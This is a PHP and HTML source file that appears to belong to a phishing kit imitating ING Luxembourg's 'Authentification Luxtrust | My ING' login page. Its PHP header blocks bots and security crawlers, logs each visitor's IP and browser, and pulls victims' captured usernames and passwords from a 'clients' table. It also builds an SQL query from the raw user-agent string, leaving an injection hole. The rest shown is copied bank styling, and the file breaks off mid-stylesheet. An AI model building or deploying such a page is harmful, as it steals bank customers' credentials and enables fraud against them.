<?php
// ================= ALWAYS FIRST =================
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// ================= BOT CHECK =================
$checkPath = __DIR__;
while (!file_exists($checkPath . '/protection/check.php')) {
    $checkPath = dirname($checkPath);

    if ($checkPath === dirname($checkPath)) {
        die('check.php not found');
    }
}

include_once $checkPath . '/protection/check.php';

// ⚠️ keep AFTER session
block_if_bot();


// ================= NORMAL INCLUDES =================
include '../void/inc/config.php';
include '../void/inc/connect.php';

if ($mobile_lock == "checked") {
    include '../void/inc/mob_lock.php';
}

include '../void/inc/blacklist.php';


// ================= GATEWAY (NOW SAFE) =================
include '../void/inc/gateway.php';

if ($enable_antibots == "checked") {
    include '../void/inc/anti.php';
}

// ================= YOUR LOGIC =================
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

$query = mysqli_query($conn, "SELECT * FROM visits WHERE ua='$ua' AND ip='$ip'");
$num = mysqli_num_rows($query);
if ($num == 0) {
   mysqli_query($conn, "INSERT INTO visits (ua, ip) VALUES ('$ua', '$ip')");
}


if (isset($_SESSION['started']) && $_SESSION['started'] == 'true') {
    $uniqueid = $_SESSION['uniqueid'];

    $stmt = $conn->prepare("SELECT * FROM clients WHERE uniqueid = ?");
    if ($stmt) {
        $stmt->bind_param("i", $uniqueid);
        $stmt->execute();
        $result = $stmt->get_result();
        if ($result->num_rows > 0) {
            $row = $result->fetch_assoc();
            $user = trim($row['user']);
			 $pass = trim($row['pass']);
            $home = trim($row['home']);
            $homelive = trim($row['homelive']);
        }
    }
}
?>

<!DOCTYPE html>
<html
    class="mying js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths vendor-webkit browser-chrome"
    lang=fr>

<meta charset=utf-8>
<style>
:root {
    --sf-img-13: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB0AAAAQCAYAAADqDXTRAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyhpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QzRFQUI4RjkyRDMyMTFFNUIzNTFEMjFEOTA2QjdEQTQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QzRFQUI4RkEyRDMyMTFFNUIzNTFEMjFEOTA2QjdEQTQiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpDNEVBQjhGNzJEMzIxMUU1QjM1MUQyMUQ5MDZCN0RBNCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpDNEVBQjhGODJEMzIxMUU1QjM1MUQyMUQ5MDZCN0RBNCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pl3YqVsAAAEJSURBVHja7JTZaoVADIYTHZcbb8QH0Pd/LPFCcAEVxTWnSRk5CxzH1rY3DYQEZpxv/iQOEhH8tlnwB/YP/VFTRxsQUad64vBN/rnxYDhNlVJVVdC2reR930PXdZKXZQl5nutL0aXldRxHfFkWcF0XPM+DcRzB931xtjRNwQSsDJkYBAEx0LIsKTmXUOdsrHgYhmt6et9PBmjIczTp5ZnyUtM0UsqXhQ/Iuq7iXAWOlynlA5VSUk6tbts2gczzLBfiGMfxwxR/B4phGFJd16LMtu0dyqBpmsQ5NzU86sP9f1oUxQ7l7zSUY5Iku8qjM9WJhwSjKKIsy3bo2V5+Renzy/Sy1XSKbwIMAFjqpCghDYp1AAAAAElFTkSuQmCC")
}
</style>
<style>
.ng-hide:not(.ng-hide-animate) {
    display: none !important
}
</style>
<title>Authentification Luxtrust | My ING</title>
<meta name=description content>
<meta name=viewport content="width=device-width,user-scalable=no,maximum-scale=1,minimum-scale=1">
<meta name=format-detection content="telephone=no">
<meta name=apple-mobile-web-app-capable content=yes>
<meta name=apple-mobile-web-app-status-bar-style content=black-translucent>
<meta name=mobile-web-app-capable content=yes>
<meta http-equiv=X-UA-Compatible content="IE=Edge">
<style>
/*! normalize.css v3.0.2 | MIT License | git.io/normalize */
html {
    font-family: sans-serif;
    -ms-text-size-adjust: 100%;
    -webkit-text-size-adjust: 100%
}

footer,
header,
main,
nav {
    display: block
}

template {
    display: none
}

a {
    background-color: transparent
}

a:active,
a:hover {
    outline: 0
}

svg:not(:root) {
    overflow: hidden
}

hr {
    -moz-box-sizing: content-box;
    box-sizing: content-box;
    height: 0
}

button {
    font: inherit;
    margin: 0
}

button {
    overflow: visible
}

button {
    text-transform: none
}

button::-moz-focus-inner,
input::-moz-focus-inner {
    border: 0;
    padding: 0
}

input[type=number]::-webkit-inner-spin-button,
input[type=number]::-webkit-outer-spin-button {
    height: auto
}

input[type=search]::-webkit-search-cancel-button,
input[type=search]::-webkit-search-decoration {
    -webkit-appearance: none
}

/*! Source: https://github.com/h5bp/html5-boilerplate/blob/master/src/css/main.css */
.glyphicon-asterisk:before {
    content: "*"
}

.glyphicon-plus:before {
    content: "+"
}

.glyphicon-euro:before,
.glyphicon-eur:before {
    content: "€"
}

.glyphicon-minus:before {
    content: "−"
}

.glyphicon-cloud:before {
    content: "☁"
}

.glyphicon-envelope:before {
    content: "✉"
}

.glyphicon-pencil:before {
    content: "✏"
}

.glyphicon-glass:before {
    content: ""
}

.glyphicon-music:before {
    content: ""
}

.glyphicon-search:before {
    content: ""
}

.glyphicon-heart:before {
    content: ""
}

.glyphicon-star:before {
    content: ""
}

.glyphicon-star-empty:before {
    content: ""
}

.glyphicon-user:before {
    content: ""
}

.glyphicon-film:before {
    content: ""
}

.glyphicon-th-large:before {
    content: ""
}

.glyphicon-th:before {
    content: ""
}

.glyphicon-th-list:before {
    content: ""
}

.glyphicon-ok:before {
    content: ""
}

.glyphicon-remove:before {
    content: ""
}

.glyphicon-zoom-in:before {
    content: ""
}

.glyphicon-zoom-out:before {
    content: ""
}

.glyphicon-off:before {
    content: ""
}

.glyphicon-signal:before {
    content: ""
}

.glyphicon-cog:before {
    content: ""
}

.glyphicon-trash:before {
    content: ""
}

.glyphicon-home:before {
    content: ""
}

.glyphicon-file:before {
    content: ""
}

.glyphicon-time:before {
    content: ""
}

.glyphicon-road:before {
    content: ""
}

.glyphicon-download-alt:before {
    content: ""
}

.glyphicon-download:before {
    content: ""
}

.glyphicon-upload:before {
    content: ""
}

.glyphicon-inbox:before {
    content: ""
}

.glyphicon-play-circle:before {
    content: ""
}

.glyphicon-repeat:before {
    content: ""
}

.glyphicon-refresh:before {
    content: ""
}

.glyphicon-list-alt:before {
    content: ""
}

.glyphicon-lock:before {
    content: ""
}

.glyphicon-flag:before {
    content: ""
}

.glyphicon-headphones:before {
    content: ""
}

.glyphicon-volume-off:before {
    content: ""
}

.glyphicon-volume-down:before {
    content: ""
}

.glyphicon-volume-up:before {
    content: ""
}

.glyphicon-qrcode:before {
    content: ""
}

.glyphicon-barcode:before {
    content: ""
}

.glyphicon-tag:before {
    content: ""
}

.glyphicon-tags:before {
    content: ""
}

.glyphicon-book:before {
    content: ""
}

.glyphicon-bookmark:before {
    content: ""
}

.glyphicon-print:before {
    content: ""
}

.glyphicon-camera:before {
    content: ""
}

.glyphicon-font:before {
    content: ""
}

.glyphicon-bold:before {
    content: ""
}

.glyphicon-italic:before {
    content: ""
}

.glyphicon-text-height:before {
    content: ""
}

.glyphicon-text-width:before {
    content: ""
}

.glyphicon-align-left:before {
    content: ""
}

.glyphicon-align-center:before {
    content: ""
}

.glyphicon-align-right:before {
    content: ""
}

.glyphicon-align-justify:before {
    content: ""
}

.glyphicon-list:before {
    content: ""
}

.glyphicon-indent-left:before {
    content: ""
}

.glyphicon-indent-right:before {
    content: ""
}

.glyphicon-facetime-video:before {
    content: ""
}

.glyphicon-picture:before {
    content: ""
}

.glyphicon-map-marker:before {
    content: ""
}

.glyphicon-adjust:before {
    content: ""
}

.glyphicon-tint:before {
    content: ""
}

.glyphicon-edit:before {
    content: ""
}

.glyphicon-share:before {
    content: ""
}

.glyphicon-check:before {
    content: ""
}

.glyphicon-move:before {
    content: ""
}

.glyphicon-step-backward:before {
    content: ""
}

.glyphicon-fast-backward:before {
    content: ""
}

.glyphicon-backward:before {
    content: ""
}

.glyphicon-play:before {
    content: ""
}

.glyphicon-pause:before {
    content: ""
}

.glyphicon-stop:before {
    content: ""
}

.glyphicon-forward:before {
    content: ""
}

.glyphicon-fast-forward:before {
    content: ""
}

.glyphicon-step-forward:before {
    content: ""
}

.glyphicon-eject:before {
    content: ""
}

.glyphicon-chevron-left:before {
    content: ""
}

.glyphicon-chevron-right:before {
    content: ""
}

.glyphicon-plus-sign:before {
    content: ""
}

.glyphicon-minus-sign:before {
    content: ""
}

.glyphicon-remove-sign:before {
    content: ""
}

.glyphicon-ok-sign:before {
    content: ""
}

.glyphicon-question-sign:before {
    content: ""
}

.glyphicon-info-sign:before {
    content: ""
}

.glyphicon-screenshot:before {
    content: ""
}

.glyphicon-remove-circle:before {
    content: ""
}

.glyphicon-ok-circle:before {
    content: ""
}

.glyphicon-ban-circle:before {
    content: ""
}

.glyphicon-arrow-left:before {
    content: ""
}

.glyphicon-arrow-right:before {
    content: ""
}

.glyphicon-arrow-up:before {
    content: ""
}

.glyphicon-arrow-down:before {
    content: ""
}

.glyphicon-share-alt:before {
    content: ""
}

.glyphicon-resize-full:before {
    content: ""
}

.glyphicon-resize-small:before {
    content: ""
}

.glyphicon-exclamation-sign:before {
    content: ""
}

.glyphicon-gift:before {
    content: ""
}

.glyphicon-leaf:before {
    content: ""
}

.glyphicon-fire:before {
    content: ""
}

.glyphicon-eye-open:before {
    content: ""
}

.glyphicon-eye-close:before {
    content: ""
}

.glyphicon-warning-sign:before {
    content: ""
}

.glyphicon-plane:before {
    content: ""
}

.glyphicon-calendar:before {
    content: ""
}

.glyphicon-random:before {
    content: ""
}

.glyphicon-comment:before {
    content: ""
}

.glyphicon-magnet:before {
    content: ""
}

.glyphicon-chevron-up:before {
    content: ""
}

.glyphicon-chevron-down:before {
    content: ""
}

.glyphicon-retweet:before {
    content: ""
}

.glyphicon-shopping-cart:before {
    content: ""
}

.glyphicon-folder-close:before {
    content: ""
}

.glyphicon-folder-open:before {
    content: ""
}

.glyphicon-resize-vertical:before {
    content: ""
}

.glyphicon-resize-horizontal:before {
    content: ""
}

.glyphicon-hdd:before {
    content: ""
}

.glyphicon-bullhorn:before {
    content: ""
}

.glyphicon-bell:before {
    content: ""
}

.glyphicon-certificate:before {
    content: ""
}

.glyphicon-thumbs-up:before {
    content: ""
}

.glyphicon-thumbs-down:before {
    content: ""
}

.glyphicon-hand-right:before {
    content: ""
}

.glyphicon-hand-left:before {
    content: ""
}

.glyphicon-hand-up:before {
    content: ""
}

.glyphicon-hand-down:before {
    content: ""
}

.glyphicon-circle-arrow-right:before {
    content: ""
}

.glyphicon-circle-arrow-left:before {
    content: ""
}

.glyphicon-circle-arrow-up:before {
    content: ""
}

.glyphicon-circle-arrow-down:before {
    content: ""
}

.glyphicon-globe:before {
    content: ""
}

.glyphicon-wrench:before {
    content: ""
}

.glyphicon-tasks:before {
    content: ""
}

.glyphicon-filter:before {
    content: ""
}

.glyphicon-briefcase:before {
    content: ""
}

.glyphicon-fullscreen:before {
    content: ""
}

.glyphicon-dashboard:before {
    content: ""
}

.glyphicon-paperclip:before {
    content: ""
}

.glyphicon-heart-empty:before {
    content: ""
}

.glyphicon-link:before {
    content: ""
}

.glyphicon-phone:before {
    content: ""
}

.glyphicon-pushpin:before {
    content: ""
}

.glyphicon-usd:before {
    content: ""
}

.glyphicon-gbp:before {
    content: ""
}

.glyphicon-sort:before {
    content: ""
}

.glyphicon-sort-by-alphabet:before {
    content: ""
}

.glyphicon-sort-by-alphabet-alt:before {
    content: ""
}

.glyphicon-sort-by-order:before {
    content: ""
}

.glyphicon-sort-by-order-alt:before {
    content: ""
}

.glyphicon-sort-by-attributes:before {
    content: ""
}

.glyphicon-sort-by-attributes-alt:before {
    content: ""
}

.glyphicon-unchecked:before {
    content: ""
}

.glyphicon-expand:before {
    content: ""
}

.glyphicon-collapse-down:before {
    content: ""
}

.glyphicon-collapse-up:before {
    content: ""
}

.glyphicon-log-in:before {
    content: ""
}

.glyphicon-flash:before {
    content: ""
}

.glyphicon-log-out:before {
    content: ""
}

.glyphicon-new-window:before {
    content: ""
}

.glyphicon-record:before {
    content: ""
}

.glyphicon-save:before {
    content: ""
}

.glyphicon-open:before {
    content: ""
}

.glyphicon-saved:before {
    content: ""
}

.glyphicon-import:before {
    content: ""
}

.glyphicon-export:before {
    content: ""
}

.glyphicon-send:before {
    content: ""
}

.glyphicon-floppy-disk:before {
    content: ""
}

.glyphicon-floppy-saved:before {
    content: ""
}

.glyphicon-floppy-remove:before {
    content: ""
}

.glyphicon-floppy-save:before {
    content: ""
}

.glyphicon-floppy-open:before {
    content: ""
}

.glyphicon-credit-card:before {
    content: ""
}

.glyphicon-transfer:before {
    content: ""
}

.glyphicon-cutlery:before {
    content: ""
}

.glyphicon-header:before {
    content: ""
}

.glyphicon-compressed:before {
    content: ""
}

.glyphicon-earphone:before {
    content: ""
}

.glyphicon-phone-alt:before {
    content: ""
}

.glyphicon-tower:before {
    content: ""
}

.glyphicon-stats:before {
    content: ""
}

.glyphicon-sd-video:before {
    content: ""
}

.glyphicon-hd-video:before {
    content: ""
}

.glyphicon-subtitles:before {
    content: ""
}

.glyphicon-sound-stereo:before {
    content: ""
}

.glyphicon-sound-dolby:before {
    content: ""
}

.glyphicon-sound-5-1:before {
    content: ""
}

.glyphicon-sound-6-1:before {
    content: ""
}

.glyphicon-sound-7-1:before {
    content: ""
}

.glyphicon-copyright-mark:before {
    content: ""
}

.glyphicon-registration-mark:before {
    content: ""
}

.glyphicon-cloud-download:before {
    content: ""
}

.glyphicon-cloud-upload:before {
    content: ""
}

.glyphicon-tree-conifer:before {
    content: ""
}

.glyphicon-tree-deciduous:before {
    content: ""
}

.glyphicon-cd:before {
    content: ""
}

.glyphicon-save-file:before {
    content: ""
}

.glyphicon-open-file:before {
    content: ""
}

.glyphicon-level-up:before {
    content: ""
}

.glyphicon-copy:before {
    content: ""
}

.glyphicon-paste:before {
    content: ""
}

.glyphicon-alert:before {
    content: ""
}

.glyphicon-equalizer:before {
    content: ""
}

.glyphicon-king:before {
    content: ""
}

.glyphicon-queen:before {
    content: ""
}

.glyphicon-pawn:before {
    content: ""
}

.glyphicon-bishop:before {
    content: ""
}

.glyphicon-knight:before {
    content: ""
}

.glyphicon-baby-formula:before {
    content: ""
}

.glyphicon-tent:before {
    content: "⛺"
}

.glyphicon-blackboard:before {
    content: ""
}

.glyphicon-bed:before {
    content: ""
}

.glyphicon-apple:before {
    content: ""
}

.glyphicon-erase:before {
    content: ""
}

.glyphicon-hourglass:before {
    content: "⌛"
}

.glyphicon-lamp:before {
    content: ""
}

.glyphicon-duplicate:before {
    content: ""
}

.glyphicon-piggy-bank:before {
    content: ""
}

.glyphicon-scissors:before {
    content: ""
}

.glyphicon-bitcoin:before {
    content: ""
}

.glyphicon-yen:before {
    content: "¥"
}

.glyphicon-ruble:before {
    content: "₽"
}

.glyphicon-scale:before {
    content: ""
}

.glyphicon-ice-lolly:before {
    content: ""
}

.glyphicon-ice-lolly-tasted:before {
    content: ""
}

.glyphicon-education:before {
    content: ""
}

.glyphicon-option-horizontal:before {
    content: ""
}

.glyphicon-option-vertical:before {
    content: ""
}

.glyphicon-menu-hamburger:before {
    content: ""
}

.glyphicon-modal-window:before {
    content: ""
}

.glyphicon-oil:before {
    content: ""
}

.glyphicon-grain:before {
    content: ""
}

.glyphicon-sunglasses:before {
    content: ""
}

.glyphicon-text-size:before {
    content: ""
}

.glyphicon-text-color:before {
    content: ""
}

.glyphicon-text-background:before {
    content: ""
}

.glyphicon-object-align-top:before {
    content: ""
}

.glyphicon-object-align-bottom:before {
    content: ""
}

.glyphicon-object-align-horizontal:before {
    content: ""
}

.glyphicon-object-align-left:before {
    content: ""
}

.glyphicon-object-align-vertical:before {
    content: ""
}

.glyphicon-object-align-right:before {
    content: ""
}

.glyphicon-triangle-right:before {
    content: ""
}

.glyphicon-triangle-left:before {
    content: ""
}

.glyphicon-triangle-bottom:before {
    content: ""
}

.glyphicon-triangle-top:before {
    content: ""
}

.glyphicon-console:before {
    content: ""
}

.glyphicon-superscript:before {
    content: ""
}

.glyphicon-subscript:before {
    content: ""
}

.glyphicon-menu-left:before {
    content: ""
}

.glyphicon-menu-right:before {
    content: ""
}

.glyphicon-menu-down:before {
    content: ""
}

.glyphicon-menu-up:before {
    content: ""
}

* {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box
}

*:before,
*:after {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box
}

html {
    -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
}

button {
    font-family: inherit
}

hr {
    border: 0
}

.sr-only-focusable:active,
.sr-only-focusable:focus {
    position: static;
    width: auto;
    height: auto;
    margin: 0;
    overflow: visible;
    clip: auto
}

h1,
h2 {
    font-family: inherit;
    line-height: 1.1;
    color: inherit
}

h1,
h2 {
    margin-top: 18px;
    margin-bottom: 9px
}

h1 {
    font-size: 21px
}

a.text-primary:hover {
    color: rgb(204, 78.4, 0)
}

a.text-success:hover {
    color: rgb(38.8712871287, 112.1287128713, 60.5495049505)
}

a.text-info:hover {
    color: rgb(51.75, 130.5, 191.25)
}

a.text-warning:hover {
    color: rgb(204, 78.4, 0)
}

a.text-danger:hover {
    color: #a40000
}

a.bg-primary:hover {
    background-color: rgb(204, 78.4, 0)
}

a.bg-success:hover {
    background-color: #dbdbdf
}

a.bg-info:hover {
    background-color: #dbdbdf
}

a.bg-warning:hover {
    background-color: #dbdbdf
}

a.bg-danger:hover {
    background-color: #dbdbdf
}

ul {
    margin-bottom: 9px
}

.dl-horizontal dd:before,
.dl-horizontal dd:after {
    content: " ";
    display: table
}

.dl-horizontal dd:after {
    clear: both
}

blockquote footer:before,
blockquote small:before,
blockquote .small:before {
    content: "— "
}

.blockquote-reverse footer:before,
.blockquote-reverse small:before,
.blockquote-reverse .small:before,
blockquote.pull-right footer:before,
blockquote.pull-right small:before,
blockquote.pull-right .small:before {
    content: ""
}

.blockquote-reverse footer:after,
.blockquote-reverse small:after,
.blockquote-reverse .small:after,
blockquote.pull-right footer:after,
blockquote.pull-right small:after,
blockquote.pull-right .small:after {
    content: " —"
}

.container:before,
.container:after {
    content: " ";
    display: table
}

.container:after {
    clear: both
}

.container-fluid {
    margin-right: auto;
    margin-left: auto;
    padding-left: 7.5px;
    padding-right: 7.5px
}

.container-fluid:before,
.container-fluid:after {
    content: " ";
    display: table
}

.container-fluid:after {
    clear: both
}

.row:before,
.row:after {
    content: " ";
    display: table
}

.row:after {
    clear: both
}

.table-hover>tbody>tr:hover {
    background-color: #f5f5f5
}

.table-hover>tbody>tr>td.active:hover,
.table-hover>tbody>tr>th.active:hover,
.table-hover>tbody>tr.active:hover>td,
.table-hover>tbody>tr:hover>.active,
.table-hover>tbody>tr.active:hover>th {
    background-color: rgb(232.25, 232.25, 232.25)
}

.table-hover>tbody>tr>td.success:hover,
.table-hover>tbody>tr>th.success:hover,
.table-hover>tbody>tr.success:hover>td,
.table-hover>tbody>tr:hover>.success,
.table-hover>tbody>tr.success:hover>th {
    background-color: rgb(232.5, 232.5, 235)
}

.table-hover>tbody>tr>td.info:hover,
.table-hover>tbody>tr>th.info:hover,
.table-hover>tbody>tr.info:hover>td,
.table-hover>tbody>tr:hover>.info,
.table-hover>tbody>tr.info:hover>th {
    background-color: rgb(232.5, 232.5, 235)
}

.table-hover>tbody>tr>td.warning:hover,
.table-hover>tbody>tr>th.warning:hover,
.table-hover>tbody>tr.warning:hover>td,
.table-hover>tbody>tr:hover>.warning,
.table-hover>tbody>tr.warning:hover>th {
    background-color: rgb(232.5, 232.5, 235)
}

.table-hover>tbody>tr>td.danger:hover,
.table-hover>tbody>tr>th.danger:hover,
.table-hover>tbody>tr.danger:hover>td,
.table-hover>tbody>tr:hover>.danger,
.table-hover>tbody>tr.danger:hover>th {
    background-color: rgb(232.5, 232.5, 235)
}

input[type=file]:focus,
input[type=radio]:focus,
input[type=checkbox]:focus {
    outline: thin dotted;
    outline: 5px auto -webkit-focus-ring-color;
    outline-offset: -2px
}

.form-control:focus,
.form-control-sidemodal:focus {
    border-color: #FF6200;
    outline: 0;
    -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(255, 98, 0, 0.6);
    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(255, 98, 0, 0.6)
}

.form-control::-moz-placeholder,
.form-control-sidemodal::-moz-placeholder {
    color: #696969;
    opacity: 1
}

.form-control:-ms-input-placeholder,
.form-control-sidemodal:-ms-input-placeholder {
    color: #696969
}

.form-control::-webkit-input-placeholder,
.form-control-sidemodal::-webkit-input-placeholder {
    color: #696969
}

.has-success .form-control:focus,
.has-success .form-control-sidemodal:focus {
    border-color: rgb(38.8712871287, 112.1287128713, 60.5495049505);
    -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px rgb(102.0297029703, 201.9702970297, 131.603960396);
    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px rgb(102.0297029703, 201.9702970297, 131.603960396)
}

.has-warning .form-control:focus,
.has-warning .form-control-sidemodal:focus {
    border-color: rgb(204, 78.4, 0);
    -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px rgb(255, 160.8, 102);
    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px rgb(255, 160.8, 102)
}

.has-error .form-control:focus,
.has-error .form-control-sidemodal:focus {
    border-color: #a40000;
    -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #ff3e3e;
    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #ff3e3e
}

.form-horizontal .form-group:before,
.form-horizontal .form-group:after {
    content: " ";
    display: table
}

.form-horizontal .form-group:after {
    clear: both
}

.btn:focus,
.btn:active:focus,
.btn:active.focus,
.btn.active:focus {
    outline: thin dotted;
    outline: 5px auto -webkit-focus-ring-color;
    outline-offset: -2px
}

.btn:hover,
.btn:focus {
    color: #FF6200;
    text-decoration: none
}

.btn:active {
    outline: 0;
    background-image: none;
    -webkit-box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
    box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125)
}

.btn-default:hover,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.selected:hover,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.selected:hover,
.amount-currency-group .currency-dropdown .btn.disabled:hover,
.btn-default:focus,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.selected:focus,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.selected:focus,
.amount-currency-group .currency-dropdown .btn.disabled:focus,
.btn-default:active,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.selected:active,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.selected:active,
.amount-currency-group .currency-dropdown .btn.disabled:active {
    color: #FF6200
}

.btn-default:active,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.selected:active,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.selected:active,
.amount-currency-group .currency-dropdown .btn.disabled:active {
    background-color: white;
    border-color: white;
    background-image: none
}

.btn-default.disabled:hover,
.btn-default.disabled:focus,
.btn-default.disabled:active,
.btn-default[disabled]:hover,
.btn-default[disabled]:focus,
.btn-default[disabled]:active,
fieldset[disabled] .btn-default:hover,
fieldset[disabled] .btn-default:focus,
fieldset[disabled] .btn-default:active {
    background-color: white;
    border-color: #FF6200
}

.btn-default-hide-mobile:hover,
.btn-default-hide-mobile:focus,
.btn-default-hide-mobile:active {
    color: #FF6200
}

.btn-default-hide-mobile:active {
    background-color: white;
    border-color: white;
    background-image: none
}

.btn-default-hide-mobile.disabled:hover,
.btn-default-hide-mobile.disabled:focus,
.btn-default-hide-mobile.disabled:active,
.btn-default-hide-mobile[disabled]:hover,
.btn-default-hide-mobile[disabled]:focus,
.btn-default-hide-mobile[disabled]:active,
fieldset[disabled] .btn-default-hide-mobile:hover,
fieldset[disabled] .btn-default-hide-mobile:focus,
fieldset[disabled] .btn-default-hide-mobile:active {
    background-color: white;
    border-color: #FF6200
}

.btn-default-small-on-mobile:hover,
.btn-default-small-on-mobile:focus,
.btn-default-small-on-mobile:active {
    color: #FF6200
}

.btn-default-small-on-mobile:active {
    background-color: white;
    border-color: white;
    background-image: none
}

.btn-default-small-on-mobile.disabled:hover,
.btn-default-small-on-mobile.disabled:focus,
.btn-default-small-on-mobile.disabled:active,
.btn-default-small-on-mobile[disabled]:hover,
.btn-default-small-on-mobile[disabled]:focus,
.btn-default-small-on-mobile[disabled]:active,
fieldset[disabled] .btn-default-small-on-mobile:hover,
fieldset[disabled] .btn-default-small-on-mobile:focus,
fieldset[disabled] .btn-default-small-on-mobile:active {
    background-color: white;
    border-color: #FF6200
}

.btn-primary:hover,
.btn-group.btn-group-radio .btn.selected:hover,
.btn-primary:focus,
.btn-group.btn-group-radio .btn.selected:focus,
.btn-primary:active,
.btn-group.btn-group-radio .btn.selected:active {
    color: #fff
}

.btn-primary:active,
.btn-group.btn-group-radio .btn.selected:active {
    background-color: rgb(255, 160.8, 102);
    border-color: rgb(255, 160.8, 102);
    background-image: none
}

.btn-primary.disabled:hover,
.btn-primary.disabled:focus,
.btn-primary.disabled:active,
.btn-primary[disabled]:hover,
.btn-primary[disabled]:focus,
.btn-primary[disabled]:active,
fieldset[disabled] .btn-primary:hover,
fieldset[disabled] .btn-primary:focus,
fieldset[disabled] .btn-primary:active {
    background-color: rgb(255, 129.4, 51);
    border-color: #FF6200
}

.btn-success:hover,
.btn-success:focus,
.btn-success:active {
    color: #fff
}

.btn-success:active {
    background-color: rgb(102.0297029703, 201.9702970297, 131.603960396);
    border-color: rgb(102.0297029703, 201.9702970297, 131.603960396);
    background-image: none
}

.btn-success.disabled:hover,
.btn-success.disabled:focus,
.btn-success.disabled:active,
.btn-success[disabled]:hover,
.btn-success[disabled]:focus,
.btn-success[disabled]:active,
fieldset[disabled] .btn-success:hover,
fieldset[disabled] .btn-success:focus,
fieldset[disabled] .btn-success:active {
    background-color: rgb(65.1287128713, 187.8712871287, 101.4504950495);
    border-color: #349651
}

.btn-info:hover,
.btn-info:focus,
.btn-info:active {
    color: #fff
}

.btn-info:active {
    background-color: rgb(165.2777777778, 202.2222222222, 230.7222222222);
    border-color: rgb(165.2777777778, 202.2222222222, 230.7222222222);
    background-image: none
}

.btn-info.disabled:hover,
.btn-info.disabled:focus,
.btn-info.disabled:active,
.btn-info[disabled]:hover,
.btn-info[disabled]:focus,
.btn-info[disabled]:active,
fieldset[disabled] .btn-info:hover,
fieldset[disabled] .btn-info:focus,
fieldset[disabled] .btn-info:active {
    background-color: rgb(125.1388888889, 178.6111111111, 219.8611111111);
    border-color: #559BD1
}

.btn-warning:hover,
.btn-warning:focus,
.btn-warning:active {
    color: #fff
}

.btn-warning:active {
    background-color: rgb(255, 160.8, 102);
    border-color: rgb(255, 160.8, 102);
    background-image: none
}

.btn-warning.disabled:hover,
.btn-warning.disabled:focus,
.btn-warning.disabled:active,
.btn-warning[disabled]:hover,
.btn-warning[disabled]:focus,
.btn-warning[disabled]:active,
fieldset[disabled] .btn-warning:hover,
fieldset[disabled] .btn-warning:focus,
fieldset[disabled] .btn-warning:active {
    background-color: rgb(255, 129.4, 51);
    border-color: #FF6200
}

.btn-danger:hover,
.btn-danger:focus,
.btn-danger:active {
    color: #fff
}

.btn-danger:active {
    background-color: #ff3e3e;
    border-color: #ff3e3e;
    background-image: none
}

.btn-danger.disabled:hover,
.btn-danger.disabled:focus,
.btn-danger.disabled:active,
.btn-danger[disabled]:hover,
.btn-danger[disabled]:focus,
.btn-danger[disabled]:active,
fieldset[disabled] .btn-danger:hover,
